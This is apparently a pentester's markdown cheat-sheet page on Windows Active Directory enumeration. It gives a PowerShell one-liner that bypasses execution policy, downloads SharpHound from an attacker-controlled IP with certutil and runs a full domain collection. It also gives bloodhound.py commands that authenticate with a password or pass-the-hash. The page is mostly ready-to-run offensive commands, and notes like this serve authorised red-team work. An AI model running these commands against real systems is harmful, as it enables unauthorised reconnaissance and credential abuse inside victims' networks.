
```bash
██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
```

## Quick Enumeration
💪💥😎 [[🤧 Username XOR Password]] 💪💥 [🗝 Credentials](🗝%20Credentials.md)  💪💥 [⏫Privesc](⏫Privesc.md)


#bloodhound #sharphound
```powsershell 
powershell -ep bypass -c "certutil.exe -urlcache -f http://192.168.0.1/tools/windows/privesc/bloodhound/SharpHound.ps1 SharpHound.ps1; Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix 'audit'; mv  *_BloodHound.zip L:\ ;"
```
```bash
python3 bloodhound.py  -u <username> -p <password> -ns $DC01 -d <domain> -c all --dns-tcp
``` 
```bash
python3 bloodhound.py  -u <username> --hashes :<hash> -ns $DC01 -d <domain> -c all --dns-tcp
``` 

